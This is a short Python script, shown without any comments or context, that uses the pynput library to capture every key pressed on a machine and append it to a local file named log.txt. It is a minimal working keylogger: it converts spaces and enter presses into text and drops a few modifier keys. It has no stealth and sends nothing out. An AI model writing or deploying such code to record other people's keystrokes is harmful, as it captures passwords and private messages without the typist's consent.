from pynput.keyboard import Listener
def writetofile(key): 
    lettre = str(key)
    
    lettre = lettre.replace("'","") 

    if lettre == 'Key.space':
        lettre = ' '  

    if lettre == 'Key.enter':
        lettre = '\n'

    if lettre == 'Key.caps_lock':
        lettre = ''

    if lettre == 'Key.shift_r':
        lettre = ''


    with open('log.txt','a') as f :
        f.write(lettre)


with Listener(on_press=writetofile) as l:
    l.join()